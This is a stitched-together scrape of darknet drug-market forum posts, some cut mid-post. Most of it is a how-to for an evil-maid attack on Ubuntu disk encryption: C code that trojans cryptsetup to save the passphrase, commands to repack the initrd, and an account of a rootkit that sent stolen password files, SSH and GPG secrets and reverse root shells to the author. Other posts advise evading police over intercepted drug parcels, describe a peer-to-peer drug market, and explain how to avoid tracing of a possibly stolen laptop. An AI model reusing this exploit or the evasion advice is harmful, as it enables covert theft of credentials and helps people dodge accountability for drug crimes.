I knew that even if the feds busted into my room while I was out and did whatever they wanted with my hard drive without me knowing, my secrets were still secret. Turns out I was wrong.Iâm going to explain how to steal the disk encryption passphrase and run arbitrary code as root on a computer running Ubuntu with whole disk encryption. I tried this on a friend of mine and managed to steal his disk encryption passphrase, the contents of his passwd and shadow files, SSH credentials for a couple of different servers, and his GnuPG secret key and passphrase. I also got reverse root shells sent to me at regular intervals. I finished up by putting a document on his desktop, digitally signed with his own PGP key, containing his disk encryption passphrase and a link to a defaced page on his web server. All it took was about 10 minutes of physical access while his computer was turned off (and of course, countless hours developing this attack beforehand). I have since apologized to him, and he has still been unsuccessful at pwning me back.This same technique will work for any Linux distribution that uses dm-crypt for whole disk encryption, which is included by default in Ubuntu, Debian, Fedora Core, and likely others. Iâm only focusing on Ubuntu because itâs popular, and that happens to be what my friend was using.0Ã10 In a NutshellYour whole hard drive is encrypted, so your information is safe from physical attacks, right? Well, no, and the reason is because with most disk encryption solutions, your whole hard drive isnât actually encrypted, just most of it. Your processor canât execute encrypted instructions; those need to be decrypted before they get executed. So by default, there must be a program that isnât encrypted whose purpose is to decrypt the rest of the hard drive. Then the operating system can load and the encrypted data can be accessed.Since this program is not encrypted, if an attacker has physical access to the computer, she can replace this program with something that does the same thing, only also does some other evll things as well. This can be done by booting to a live CD to access the hard drive or, in case of a BIOS password, just removing the hard drive (which is what I had to resort to). In most Linux implementations of whole disk encryption, the small boot partition remains unencrypted, and everything else is encrypted. This attack works by modifying files in the boot partition to do our evil deeds.Also, weâre using a computer for this attack, which means we can write programs to automate it. It becomes as easy as: pop in a live CD, boot up, run a script, shut down, remove CD, and the victim is pwned, despite disk encryption.In Windows, disk encryption using both PGP Desktop and TrueCrypt must work the same way, by installing a small unencrypted program thatâs used to decrypt the rest of the drive. So, theoretically, these two disk encryption solutions must be vulnerable to this same attack.0Ã20 The Vulnerable initrd.imgIn Ubuntu, the boot partition holds two files necessary to boot into your operating system: vmlinuz and initrd.img. They have the kernel version appended to the end of their filenames. You can tell the exact names by looking at your grub menu file /boot/grub/menu.1st. This is from mine:title Ubuntu 8.04.1, kernel 2.6.24-21-genericroot: (hd0,0)kernel /vmlinuz-2.6.24-21-generic root=/dev/mapper/ubuntu-root ro quiet splashinitrd /initrd.img-2.6.24-21-genericThe vmlinuz file is the compressed Linux kernel that you need when booting up. The initrd.img file is a compressed initial ramdisk made up of a little filesystem full of files required to boot the rest of the way into Linux. Itâs only necessary to have an initrd.img file when you need to do some special things before you boot all the way into the OS, like load extra kernel modules and unlock the encrypted hard drive. If you have multiple Linux kernels installed, youâll have multiple vmlinuz and initrd.img files in your boot partition.So how does this all work? You turn on your computer and boot to your hard drive. Grub loads menu.1st and autoselects the first option for you, and an Ubuntu logo pops up and your system starts booting. Your initrd.img file gets decompressed in memory. Itâs essentially a filesystem with lots of common commands, including the /bin/sh shell. It has an executable script called /init, which executes everything needed to unlock and mount your encrypted partitions. The /init script gets run, and it in turn runs the program /sbin/cryptsetup, which asks for your passphrase. Once you type in the correct passphrase crypsetup unlocks the encrypted section of your hard drive, and then the /init script mounts all the partitions, and does other startup stuff. Once this is complete, the initrd.img filesystem closes and the OS starts to load the rest of the way.initrd.img files are compressed with cpio, and then compressed again with gzip. Hereâs an easy way to decompress your initrd file to see whatâs inside:m0rebel@ubuntu:~$ cd /tmpm0rebel@ubuntu:/tmp$ mkdir initrdm0rebel@ubuntu:/tmp$ cd initrd/m0rebel@ubuntu:/tmp/initrd$ cp /boot/initrd.img-2.6.24-21-generic ./initrd.img.cpio.gzm0rebel@ubuntu:/tmp/initrd$ gunzip initrd.img.cpio.gzm0rebel@ubuntu:/tmp/initrd$ cpio -i < initrd.img.cpiom0rebel@ubuntu:/tmp/initrd$ rm initrd.img.cpiom0rebel@ubuntu:/tmp/initrd$ lsbin conf etc init lib modules sbin scripts usr varm0rebel@ubuntu:/tmp/initrd$ ls -l sbin/cryptsetup-rwxr-xr-x 1 m0rebel m0rebel 52416 2008-10-20 17:33 sbin/cryptsetupm0rebel@ubuntu:/tmp/initrd$To recompress initrd.img, do this:m0rebel@ubuntu:/tmp/initrd$ find . | cpio --quiet --dereference -o -H newc | gzip > /tmp/poisoned-initrd.imgTo tie it all together, these files are all stored in /boot/initrd.img on your unencrypted boot partition. An attacker with physical access to a victimâs computer can either boot to a live CD, live USB device, or remove the hard drive and put it in another computer to modify these files.0Ã30 Stealing the Crypto PassphraseTo steal the disk encryption passphrase, you need to replace the /sbin/cryptsetup binary in the initrd.img file with an evil one that does your bidding. Luckily, cryptsetup is open source. First, make sure you have all the right development tools and dependencies installed to compile cryptsetup, and the cryptsetup source code.m0rebel@ubuntu:~$ sudo apt-get install build-essentialm0rebel@ubuntu:~$ sudo apt-get build-dep cryptsetupm0rebel@ubuntu:~$ mkdir cryptsetupm0rebel@ubuntu:~$ cd cryptsetup/m0rebel@ubuntu:~/cryptsetup$ apt-get source cryptsetupm0rebel@ubuntu:~/cryptsetup$ lscryptsetup-1.0.5 cryptsetup_1.0.5-2ubuntu12.diff.gz cryptsetup_1.0.5-2ubuntu12.dsc cryptsetup_1.0.5.orig.tar.gzm0rebel@ubuntu:~/cryptsetup$The directory cryptsetup-1.0.5 holds the actual source code. It took me a while, searching through the code looking for the âEnter LUKS passphrase:â prompt, before I found the correct file and line to add my evil code. It turns out that cryptsetup-1.0.5/lib/setup.c, around line 650, is the correct place. Right before line 650 is this if statement:if((r = LUKS_open_any_key(options->device, password, passwordLen, &hdr, &mk, backend)) < 0) {  set_error(""No key available with this passphrase.\n"");  goto out1;}This basically means, âif the passphrase that was just entered doesnât work, give an error message and then jump to another part of the code.â Right after that, add my evil code:if((r = LUKS_open_any_key(options->device, password, passwordLen, &hdr, &mk, backend)) < 0) {  set_error(""No key available with this passphrase.\n"");  goto out1;}/* begin evil code */else {  system(""/bin/mkdir /mntboot"");  system(""/bin/mount -t ext3 /dev/sda1 /mntboot"");  FILE *fp = fopen(""/mntboot/.cryptpass"", ""w"");  fprintf(fp, ""%s\n"", password);  fclose(fp);  system(""/bin/umount /mntboot"");}/* end evil code */This basically says, âbut if the passphrase does work, then create a new directory called /mntboot, mount the unencrypted boot partition to this new directory, create a new file called /mntboot/.cryptpass in this directory, write the encryption passphrase to it, close the file, and unmount the partition.â This will writethe encryption passphrase in plaintext to a file called .cryptpass in the boot partition.You can then save the file and compile it. After compiling it, I like to build a debian package, then extract it, to see all the files it creates in the right directory structure.m0rebel@ubuntu:~/cryptsetup/cryptsetup-1.0.5$ ./configurem0rebel@ubuntu:~/cryptsetup/cryptsetup-1.0.5$ makem0rebel@ubuntu:~/cryptsetup/cryptsetup-1.0.5$ sudo dpkg-buildpackagem0rebel@ubuntu:~/cryptsetup/cryptsetup-1.0.5$ cd ..m0rebel@ubuntu:~/cryptsetup$ mkdir rootm0rebel@ubuntu:~/cryptsetup$ dpkg -x cryptsetup_1.0.5-2ubuntu12_i386.deb root/m0rebel@ubuntu:~/cryptsetup$ ls -l root/sbin/total 56 -rwxr-xr-x 1 m0rebel m0rebel 52632 2008-10-20 18:01 cryptsetupm0rebel@ubuntu:~/cryptsetup$And there you have it: an evil, trojaned cryptsetup binary. Now all you need to do is get a copy of the victimâs initrd.img file from their unencrypted boot partition, extract it, copy root/sbin/cryptsetup to initrd/sbin/cryptsetup, copy root/initramfs-tools/scripts/* to initrd/scripts/, and then recompress the initrd.img file and replace it. The next time the victim boots up and enters their passphrase, a new file will be saved in plaintext in /boot/.cryptopass. Pretty cool, huh?Most of the attack on my friend relied on this exact same technique, taking the source code from the Ubuntu repository for programs he uses all the time (cryptsetup, openssh, gnupg) and modifying them to be evil.0Ã40 Did Someone Say Rootkit?But it gets better. If you have access to the initrd.img file, you can not only put an evil cryptsetup binary in there, but you can also change around the init script to make it evil. This means that when the computer is booting up, after you steal the encryption passphrase, after cryptsetup unlocks the hard drive, and after the init script mount the encrypted partition, you can then write whatever you want to the root partition.While pwning my good friend, I made cryptsetup write his encryption passphrase to the ramdisk, not the boot partition. I modifed the init script to then copy his encryption passphrase, a copy of the original, unpoisoned initrd.img file, and a couple of other evil binaries to his root partition. It then added some files to his /etc/init.d and /etc/rcX.d directories to make a couple things run on bootup. After the init script finished executing, and Ubuntu began loading the rest of the way, it ran my init scripts. Keep in mind, these startup scripts get run as root, which spells 0wned.One of the startup scripts moved the unpoisoned initrd.img back into his boot partition (so this attack wouldnât happen every time he booted up, only once). It also wrote his encryption passphrase, /etc/passwd, and /etc/shadow to a dump file. It then deleted itself and the files that made it run on boot up. The evil ssh and gpg binaries also wrote passwords to this same dump file. The other startup script ran an evil Python script in the background. This script was an infinite loop that waited 15 minutes, sent me the contents of the dump file over the internet, then waited another 15 minutes and sent a reverse netcat root shell to me.Thatâs just how I did it. There are a million other ways to do it, and hackers much more talented than me in rootkit development probably know how to do the same thing, only a lot stealthier.0Ã50 Self-DefenseThis whole attack relies on modifying unencrypted files on your hard drive, so the defense is simply donât keep any unencrypted files on your hard drive. Carry them with you on a USB stick instead. This way, if an attacker gets physical access to your computer, all they can do is stare at the encrypted data scratching their heads. You have to make sure you keep a close watch on your USB stick, though. I keep it on my keyring, and never leave it lying around.While installing Ubuntu, keep a USB stick plugged into your computer. When you get to the partitioner, do a manual partition. Make your USB stick hold /boot, and then make the rest a âphysical volume for encryptionâ. Inside there, make a âphysical volume for LVM,â and inside there put your root, swap, and any otherpartitions you might want. Install grub to the master boot record of your USB stick, not your internal hard drive.If you donât want to reinstall your operating system, you can format your USB stick, copy /boot/* to it, and install grub to it. In order to install grub to it, youâll need to unmount /boot, remount it as your USB device, modify /etc/fstab, comment out the line that mounts /boot, and then run grub-install /dev/sdb (or wherever your USB stick is). You should then be able to boot from your USB stick.An important thing to remember when doing this is that a lot of Ubuntu updates rewrite your initrd.img, most commonly kernel upgrades. Make sure your USB stick is plugged in and mounted as /boot when doing these updates. Itâs also a good idea to make regular backups of the files on this USB stick, and burn them to CDs or keep them on the internet. If you ever lose or break your USB stick, youâll need these backups to boot your computer.One computer I tried setting this defense up on couldnât boot from USB devices. I solved this pretty simply by making a grub boot CD that chainloaded to my USB device. If you google âMaking a GRUB bootable CD-ROM,â youâll find instructions on how to do that. Hereâs what the menu.1st file on that CD looks like:default 0timeout 2title Boot from USB (hd1)root (hd1)chainloader +1I can now boot to this CD with my USB stick in, and the CD will then boot from the USB stick, which will then boot the closely watched initrd.img to load Ubuntu. A little annoying maybe, but it works.0Ã60 ConclusionAll this may seem a little paranoid, but ignoring this attack isnât worth it when you have real secrets to hide, or if you value your privacy. If youâre worried about a competent attacker (and government agents occasionally have their competent moments), you might as well just not encrypt your hard drive. But thatâs stupid. Encrypt everything. Itâs important to freedom."

"Silk Road 2 Forums","whom","1878","2013-11-05T03:43:26","Pwning past whole disk encryption [A Guide]","Discussion/Security","An Evil Maid attack assumes that an adversary has physical access to your computer.   Full Disk Encryption doesn't really encrypt the *whole* disk.  You have to have something unencrypted to actually *boot*, at which point, it programatically tries to decrypt and mount the now-decrypted storage so it can continue the boot process.   So the BIOS boots a basic kernel, which, in turn, usually uses a cryptographic key, stored fully readably on your HD, that's protected by a passphrase.   Password Based Key Derivation Functions (PBKDFs) make it harder to brute force the passphrase.  So normally, your machine boots a small kernel then prompts you for the passphrase.  You enter it, it uses that phrase to unlock the actual keyfile that encrypts the remainder of your HD.  Then it can decrypt the encrypted partition (which is all of your hard drive except the basic boot stub you need to unlock the encryption), and your OS boots normally.  An evil maid attack assumes somebody has physical access.  So they mount that unencrypted little stub partition that holds the boot image and keyfile, and put some malicious code onto it.  Now, when you get to the point where you're typing in your passphrase, their malicious code is recording that passphrase somewhere on the disk.  Looks like a normal login to you, and you continue completely unaware that anything is different.  Fast forward to some point down the line.   Adversary seizes your computer.  They retrieve the passphrase their malicious code stashed after it intercepted it from you, and they can then decrypt your entire hard drive.  You can google for ""evil maid attacks"" and find some methods to defeat them.  The only decent one is to boot your machine from removable storage (i.e. USB) that contains the keyfile and gives you a trusted environment to unlock the entire disk.   Downside to that is.. you're always booting off USB, and if something happens to that USB key, the hard drive is unrecoverable.   Obviously, if you lose physical control over the USB key, same thing can happen to it.  There are also methods to utilize the TPM in your processor to verify the integrity of your image.  It gets difficult fast, and is relying on giving you clues that something's wrong, but if you're interested, somewhere on the Qubes site is a decent explanation of a way to do that w/ Qubes.  The evil maid attack, by the way, is why when people talk about remote servers (i.e. hidden services, like Tormail) being fully encrypted, everybody should roll their eyes a bit.  How do you enter the keys to a remote server to decrypt it at boot in a way that isn't succeptible to the same attack?  It's even easier to do, because you never have physical control over the remote server.  Not to worry everyone, but there's no reason why a sophisticated attack with root access to a box couldn't accomplish the same thing.  So while we all *say* it requires physical access to your box, if they can root the box while it's running, they should be able to drop malicious code onto the boot partition as well.  Next time you cold boot it, it could grab the passphrase and stash it somewhere.  Same result.  Of course, if they've rooted the box while it's booted and the disk has been unlocked, they already have access to all those files anyway.

"Silk Road 2 Forums","Distantimporter","38179","2014-04-25T04:27:08","Inside the âDarkMarketâ Prototype, a Silk Road the FBI Can Never Seize ","Discussion/Security","A blog post I found interesting  Direct link contains videos some of which is interesting to say the least.   Check it out educate and debate  :  ***CLEARNET---->    http://www.wired.com/2014/04/darkmarket/    (full post with videos)  The Silk Road, for all its clever uses of security protections like Tor and Bitcoin to protect the siteâs lucrative drug trade, still offered its enemies a single point of failure. When the FBI seized the server that hosted the market in October and arrested its alleged owner Ross Ulbricht, the billion-dollar drug bazaar came crashing down.  If one group of Bitcoin black market enthusiasts has their way, the next online free-trade zone could be a much more elusive target.  At a Toronto Bitcoin hackathon earlier this month, the group took home the $20,000 first prize with a proof-of-concept for a new online marketplace known as DarkMarket, a fully peer-to-peer system with no central authority for the feds to attack. If DarkMarketâs distributed architecture works, law enforcement would be forced to go after every contraband buyer and seller one by one, a notion that could signal a new round in the cat-and-mouse game of illicit online sales.  âWhat doesnât kill you makes you stronger,â said Amir Taaki, one of DarkMarketâs creators and the founder of the anarchist group Unsystem, in a short speech at the Toronto Bitcoin Expo unveiling the project. He compared DarkMarketâs improvements on the now-defunct Silk Road to the advent of Bittorrent, a decentralized technology that revamped Napsterâs more vulnerable model of filesharing and flummoxed copyright enforcers. âLike a hydra, those of us in the community that push for individual empowerment are in an arms race to equip the people with the tools needed for the next generation of digital black markets.â DarkMarket's experimental interface. (Click to enlarge.)  DarkMarketâs experimental interface. (Click to enlarge.)  DarkMarket, Taaki and its other developers admit, is still just an experimental demonstration. They have yet to integrate anonymity protections like Tor into the software; currently every userâs IP address is listed for every other user to see. And black market enthusiasts shouldnât expect DarkMarketâs creators to finish the open source project themselves any time soonâTaaki says heâs focused on polishing his anonymous Bitcoin software project Dark Wallet, and his co-creators Damian Cutillo and William Swanson say theyâre tied up with their own Bitcoin startup known as Airbitz.  âThis is just a simple prototype, but we wanted to show people that itâs possible,â Taaki says. âBut this is going to happen. If not us, someone else will do it.â  Taaki argues that DarkMarketâs code, posted to GitHub, already has all the basic ingredients that made Silk Road a giant underground success: the ability for buyers and sellers to communicate privately and make payments to each other, pages where sellers can show their wares, a reputation system for sellers with ratings and reviews, and an escrow system that protects payment until goods are received by the buyer. âAnd itâs all totally decentralized,â says Taaki.  Achieving those functions, while also preventing scams and fraud, is no simple task. Two of DarkMarketâs creators, Swanson and Cutillo, gave WIRED a demo of the software along with a step-by-step explanation of how a typical deal would go down. What they revealed is a Rube Goldberg machine of checks and balances designed to prevent users from cheating each other, without ever requiring oversight from an administrator or other authority figure.  Hereâs how it works:      A user downloads the DarkMarket software, which runs as a daemon in the background of the userâs operating system, allowing them to connect to the DarkMarket network through any browser. The DarkMarket daemon incorporates a library of commands for peer-to-peer networking known as ZeroMQ, which allows the userâs PC to become a node in a distributed network where every user can communicate directly with every other user.     Screen Shot 2014-04-22 at 4.46.25 PM      An example DarkMarket seller page showing MDMA pills for sale.     Any DarkMarket user can become a seller on the market simply by editing an HTML file that DarkMarket designates as his or her seller page, adding pictures and descriptions of items for sale just as he or she would on the Silk Road or eBay. (For users with nothing to sell, the page remains blank.) Buyers can browse the market by clicking on other usersâ DarkMarket nodes or search for a sellerâs nickname to view their seller pages. At the moment, DarkMarket displays only a bare IP address for every user, but the systemâs creators say it will eventually show a pseudonym for each one and also allow product searches.     When a user wants to buy something, he or she sends an order message (âIâll take ten of your finest MDMA dosesâ) to the seller. If the seller agrees, the buyer and seller together choose what DarkMarket calls an âarbiter.â Since the market doesnât have any central authority, the arbiterâs job is to settle any disputesâto serve as a tie breaker in any stalemate that might arise if the deal goes sour. Both the buyer and seller can keep a list of approved arbiters, and one will be chosen at random from the overlapping names on their lists. âThe arbiter is just another peer on the network,â says Swanson. âJust as anyone can be a buyer or seller, anyone can be an arbiter.â     Once the buyer, seller and arbiter for a transaction are chosen, DarkMarket creates a new Bitcoin address that will serve as the escrow, holding the buyerâs money until the transaction is complete. But this isnât any run-of-the-mill Bitcoin address; It combines the three usersâ public encryption keys, created based on a private encryption key generated when they installed DarkMarket, to offer whatâs known as a âmultisignatureâ address. That address is designed so that once the buyerâs bitcoins go into it, they can only be moved again if two out of three of the parties agrees and signs that transaction with the private key that controls their Bitcoins.     The buyer moves his or her money to the escrow address. If the product is shipped and arrives, the buyer and seller both sign a transaction to move the escrowed bitcoins to the seller. If the product doesnât arriveâor if itâs defective, or some other dispute arisesâthe buyer and the seller may both try to move the bitcoins into their own account. In that case the arbiter can choose which transaction to sign, which determines where the coins end up. The arbiter can also demand a payment for his or her services, which would be split off from the bitcoins.     After a transaction, every participant can leave ratings and reviews for every other participant. Those reputation measurements are cryptographically signed with the writerâs private key so that they canât be forged, and copied to other nodes on the network. When a user visits a seller page, the ratings and reviews for that seller are pulled from other nodes to display the sellerâs track record, preventing fraud and rewarding good customer service.     To create consistent identities and prevent untrustworthy users from impersonating trusted ones, DarkMarket nodes keep a list of all the public keys and nicknames of every user on the network. This ledger of names and keys is periodically put through a cryptographic function known as a hash and added to the Bitcoin blockchain by including it in a small transaction. That trick prevents anyone from altering the ledger to steal someoneâs identity; When a user searches for a nickname on DarkMarket, the software looks at the blockchain to check the userâs key against the ledger before displaying that userâs seller page. (So far, Taaki has made DarkMarketâs identities to the Bitcoin blockchain manually, but he says he plans to automatic the process.)  If DarkMarket improves and catches on among contraband traders, itâs not exactly clear what legal risks Taaki and his fellow coders might be taking. Taaki argues that heâs merely distributing a programânot running a criminal conspiracy. âIâm just a humble coder,â he says. âCode is a form of expression. You canât imprison someone for speaking an idea.â  And if the creators of a fully peer-to-peer black market were to be locked up? If all goes according to plan, their leaderless community would go about business as usual.  Hereâs a video made by an audience member at Taaki and Swansonâs presentation of DarkMarket at the Toronto Bitcoin Expo.",""

Then say nothing else at all other than you want a lawyer.  If they have asked you to go and collect a package phone them and ask them why it must be opened there?   Also, tell them you weren't expecting any deliveries and ask where it came from. You don't want to seem shady, it's not unusual to open mail addressed to yourself. If they answer reasonably, go and open it. That way you look innocent - who goes to a customs office to open a package of drugs knowingly?   Buying BTC doesn't mean you bought drugs online. BTC is legal. Even then they need to prove that you sent those BTC to SR and from there they need to prove you bought those particular items which is impossible without access to your SR account - maybe not impossible but not worth their funding.    Play it cool; if they arrest you, do not say anything other than that you want a lawyer. If you don't have your own lawyer, do not tell him/her that you ordered the drugs as if it goes to court, a lawyer can't willingly lie for you, so if asked if you ordered the drugs they will not be able to say 'no my client did not'.

To accomplish this the PORTAL device itself is physically isolated and locked down to prevent malicious tampering originating from the protected network. So if the userâs computer is compromised by malware, the malware is unable to modify the Tor software or configuration, nor can it directly access the Internet (completely preventing IP address leakage). Additionally, the PORTAL is configured to fail close â if the connection to Tor drops, the user loses their Internet access. Finally, the PORTAL is âidiot proofâ, simply turn it on and it works.The Implementation, the Pain, the HorrorThe initial requirement was to develop PORTAL for a small personal sized router, such as the TP-Link 703N, 3040, or M1U. All of these devices are small, portable and support the OpenWRT open source router firmware. Unfortunately, it turns out that âsmallâ and âportableâ is synonymous with âweakâ and âunderpoweredâ.Unfortunately, Tor is quite resource intensive for an embedded device. Tor uses 16MB of RAM and for complete functionality (requiring the GeoIP database) it occupies slightly over 1.2MB of squashfs space. The stock TP-LINK routers have only 4MB of flash and 16MB of RAM (later models have increased RAM). This caused a lot of problems when building early versions. A bare bones OpenWRT system stripped down to just support an Internet uplink USB device occupies 3.2MB of squashfs space. Using the power of math we see: 3.2 + 1.2 > 4.0. Fuck.Enter The Dragon, or Chinese Hackers to the RescueFortunately, the TP-LINK routers are not just small, they are also extremely hackable. They are very popular with hackers who have modified the hardware and expanded the capabilities of the stock device. I got in contact with a Chinese hacker who has upgraded the TP-LINK 703N to 16MB of flash and 64MB of RAM. Sweet. Using these modified routers development of the PORTAL became much much easier.PORTAL System ArchitectureThe PORTAL requires a minimum of two network interfaces: one for the Internet uplink, and one for the isolated network segment. In order to protect the PORTAL from tampering from malware (or malicious users), it also requires a third administration interface. This can be either a serial console, or physical connection. The reason not to use WiFi for the administration network is that that would expose the administration interface to anyone within WiFi range, including potentially the userâs compromised laptopâs WiFi card.Three Interfaces to Rule Them AllThe requirement to protect the PORTAL from a malicious user caused some problems since the device hardware has very limited interfaces. The TP-LINK 703N has only:* 1 x USB 2.0* 1 x 100MB ethernet* 1 x onboard wifiAll available interfaces are required to get us to the three networks we need:* Tor: isolated proxy interface    * Tor SOCKS proxy    * Tor Transparent TCP proxy    * Tor Transparent DNS proxy    * DHCP (optional)* Admin: configuration management interface    * ssh    * https (optional)    * DHCP (optional)* Internet: uplink connection interface    * No servicesOperational PORTALAfter the user has configured the Internet, and whatever other adjustments they wish to make, they shouldnât need to connect to the Admin interface again. This leaves us with a very hard target for any attacker who wishes to unmask us (modulo any issues with Tor itself).The PORTAL has been hardened to make it significantly more difficult for the user to make a mistake, or for an attacker to subvert the Tor protections. From the Tor network the only exposed ports are Torâs DNS proxy, TCP proxy, and SOCKS. Optionally, you can use DHCP on this network.If, somehow, the firewall doesnât work properly, youâre still safe because the PORTAL doesnât actually route packets. The only way you can reach the Internet (regardless of which interface youâre connected to) is via Tor. This stops stupid mistakes, such as connecting to the Admin interface and forgetting to swap to the Tor network. Donât worry, you canât do that, it wonât work, youâre welcome.Final hardening is left up to the user who will have to assign the Admin and Tor networks to physical interfaces. There are security trade offs either way.    Medium Security:        Tor = WiFi        Admin = Ethernet        pros: ease of use        cons: pre-Tor plaintext will be broadcast over the AEther (see: Hammond)    Maximum Security:        Tor = Ethernet        Admin = WiFi        pros: ultra secure        cons: if an attacker cracks your WPA2 PSK, theyâll have access to your management sshd. Of course, theyâll be so physically close to you at that point, leaking your IP is the least of your worries.        NOTE: remote the WiFi card from your computer to block access via malware compromiseJust Do ItThe PORTAL project has been migrated to the RaspberryPi, which has more power to support Tor. It requires more configuration, which is something Iâll work on, however the ease of acquisition of the RPi makes this the current platform of choice. So go install PORTAL of Pi and compartment all of your sensitive operational activities inside an isolated Tor network."

"Silk Road 2 Forums","El Presidente","1620","2013-10-29T23:46:23","Could someone give an example of an 'anonymizing middle box running Tor'?","Discussion/Security","We have taken a slightly different approach with this in the past, one that provides a little additional security at the cost of a little usability. We provide it here for information - it may be useful for some.  The fundamental difference is that rather than transparently route all traffic from the secure box and into tor we only route explicitly defined traffic.   The Middle Box A simple TOR client dual-homed host, ideally on a physical host. It will have two network interfaces, a public interface which connects to the Internet (ideally through a NATting router or firewall) and a private interface. This system must be hardened because it will be able to establish arbitrary connections to the Internet. It will run TOR in client mode and will expose the SOCKS proxy to the private network only. Ideally it should be hard-coded to connect to trusted guard nodes, preferably ones that you either run or know to be safe. At the least the guard nodes should be local to you in network terms. This system should be configured to drop all inbound connections on the public interface regardless of any upstream firewalls. The system should also be configured to drop all traffic on and out on the private interface except inbound traffic to the local SOCKS proxy port (9050/tcp or similar). For good measure the middle box should also drop all outbound UDP traffic to the Internet.   The Private network This network exists purely between the middle box and the secure box.  Ideally this should be a simple cross-over cable which connects the two systems. Wireless is acceptable but the key thing is that the private network cannot route anywhere other then between the Middle and Secure boxes and it will be carrying plain-text, sensitive traffic and thus must be protected from eavesdropping. The private network must have no default gateway and no DNS.   The Secure Box The key tenet of this system is that it does not know where it is or have any way of finding out where it is. This system has a single network interface on the private network. Again, there must be no default gateway, no DNS nothing. Just a simple static IP address and no more. The local firewall (iptables) should be configured on this system to drop all inbound traffic and block all outbound traffic except outbound to the SOCKS port on the middle box. The browser on this system should be configured to use the SOCKS proxy on the middle box. If there is a requirement to use any other application other than the browser then it must explicitly be configured to use SOCKS or, failing that, executed using 'torsocks' which again will use the SOCKS proxy on the middle box. Ideally the hostname of this system should be 'computer' or 'server' and only one user should be configured called 'user', ensure the mac address of the system is modified from the hardware default at boot time - ideally randomized each boot. In terms of OS, anything that is non persistent is nearly always better such as TAILS. The systems should have no microphone, no camera, no GPS and ideally no wireless (wlan, bluetooth, GSM, etc). Nothing that allows it to interact with the real world in any way except via that SOCKS proxy.  When looking at the hardening of the secure box, imagine you are a bad guy somewhere who has gained unrestricted access to the system and ask yourself:  a) can you break out of it in any way that will cause you to generate network traffic that will not go through the SOCKS port and into TOR? if you can then something is wrong, rethink. b) can you extract anything from the system that provides IRL identity information - for instance address details that you might use to copy/paste into order forms? If you can find anything of value then something is wrong, rethink.  This model can be virtualized easily enough but at the cost of some security. If virtualized then make sure file sharing from guest to host is disabled, shared clipboards etc. The virtualization software should be configured to provide as much isolation between the guest and host systems as possible.  Our preferred setup for this is simple and uses a Rasberry PI as the middle box and an old laptop connected via a cross-over ethernet cable. The PI connects wirelessly to the local broadband router.

It seems the reviews are great, but, and excuse me if this comes across as ignorant, are vendors able to make buyer accounts and just jack their ratings up as they will? I feel like his product (Which I purchased, havent even tried to sell), will just be tested when you try to test it.   Another reviewer said that this stuff is availible on Alibaba for 3$. What do you guys think?   If one did go and sell this, wouldn't every gold and silver place be trying tests on before they even thought about buying it?   Back to the ratings, I bought it because I knew his ratings: the vendor was a dick acted very calm and nice to me answering my questions then after I sent a glowering review(before even getting my product open) and then he turned into a douche and went off on me and basically said he only was as helpful as he was because of the review he wanted.  Anyways, can sellers get their own buyers account after account after account jack up their own ratings? And also, this Gus Firing, has anyone or does anyone know if ANY of the gold he has sold ever flipped two or three times their money back.  Let me know whats up. Also, the laws on selling this kinda thing; are they harsh?  Thanks, I was taken victim and bought one never sold it but I am curious if it would really work. What set me off today is reading his reviews where a customer is cussed out or such by the vendor because his product did not sell at the pawn. Gus blamed it on the customer ""Imbelcility"". I am just wondering if since all the reviews 80% are great the few that arents are complete 1/5.  Has anyone ever tried to sell his product? PM or message here if you have. I am sitting here trying to see if it is worth it selling tommorrow or the weekend.

I know there is a thread in the forums that tell you how to set up an Electrum wallet on Tails, but I didn't know that Multibit worked with Tails. I have a Multibit wallet on my computer desktop and an Electrum wallet set up on Tails. I don't use the Multibit wallet anymore, but I remember once I couldn't find my wallet and I was freakin' out too. Try this: there's a button along the top of the Multiibit wallet that says ""Messages"" or something. In the messages, it describes to you exactly where your wallet is on your computer. It looks something like this: User--> C ---> App data --> Roaming --> Multibit --> default wallet, etc. Follow that trail and see if you can't find your wallet. The problem is, you set up the wallet on Tails, and I don't know how that works. If you set it up in persistence it should be there. But, from what you've described, it sounds like you set it up in Amnesia, which I think wipes all the data on it every time you shut down Tails. In this case, your wallet may be gone, my friend. Here's an idea: Did you happen to copy the secret key or the generation seed to your Multibit wallet?? If so, I think you can import it into blockchain.info and there you will have access to all your bitcoins. Give my suggestions a try, then let me know how it goes. Good luck!!  ~Hippiechick","Ok, I'm convinced 95% my wallet used to receive my BTCs is gone.  Any options?  I don't undestand how that can be.  I named the Wallet and I put a passwrd on the wallet before I sent the coins to it.  What gives?  Is this a Multibit client bug?  Apparently, Multibit does all kinds of backups so, how is just this one wallet gone?  I'm so screwed!  Not a great 1st time experience that's for sure!Anyone I can discuss this with without letting on I was send to MultiBit Client under Tails?Thanks!Cram"

Now THAT makes sense, and you have the right idea. Bypassing LBC is not possible because sellers on LBC release escrow to your wallet only on LBC; you can't send them a Multibits address and ask them to send the coins there.    Yes, send me a PM with more info, and I'll look at my Multibits wallet (which I cannot do now because I'm on Tails) and I will try to remember how I uncovered my lost Multibits wallet some time ago. However, it's my thinking that you may be right---Mulibits and Tails are just incompatible. But if that were true, why are your other Multibits wallets still there? It just doesn't make sense. Again, did you do a backup of your wallet somewhere?? If you did, you can import that backup into a wallet you make on blockchain.info and at least recover your lost bitcoins.

Silkroad Original is DOWN today mostly b/c it was being RUN from INSIDE the US.

Safe-mail has all of that - check around the darknet and you will see many safemail addys for hitmen... CP.... etc..... Who wants to have neighbors like that? But besides the moral issue --- the real issue is -- Safemail is at high risk for legal action  not just from the US So by all means -- use PGP, but if you are human and even very occasionally make a mistake.. dont let it cost you your freedom.

I hope you stole it and left zero evidence because if you got it at a public auction then maybe your names on a list of atendees or purchasers on a receipt.   When schools buy equipment they log all of it, MACs, serial numbers, everything for many different reasons. Audits, upgrades, theft etc etc  Lets say you use it an get de-anoned.....wtf is this? Its a computer reigstred to *certain school*. LEO researches into it and finds those groups of computers were upgraded and sold at public auction. They get list of atendees/purchasers/receipts/CCTV footage/etc and go through the list until they hit upon something.    Minimum:  1) Scrap that hard drive. Destroy the shit out of it and get a new one - untracable! Better yet, use tails and forget a hard drive altogether.   2) Change the NIC/WIFI card, those MACs are recorded I assure you. Again, make sure its an untracable NIC.    As for having anything 'built in' to computers to track - No. The only place they would is on the hard drive anyway. Unless you have a FBI/DEA/NSA computer or some shit. No school corps going to pay for some extra fancy shit like that. Maybe, maaaayyyyybeee, they have some tracking program on the Hard drive to see if its stolen when it connects to an internet connection but thats unlikely. Unlikely, not impossible.

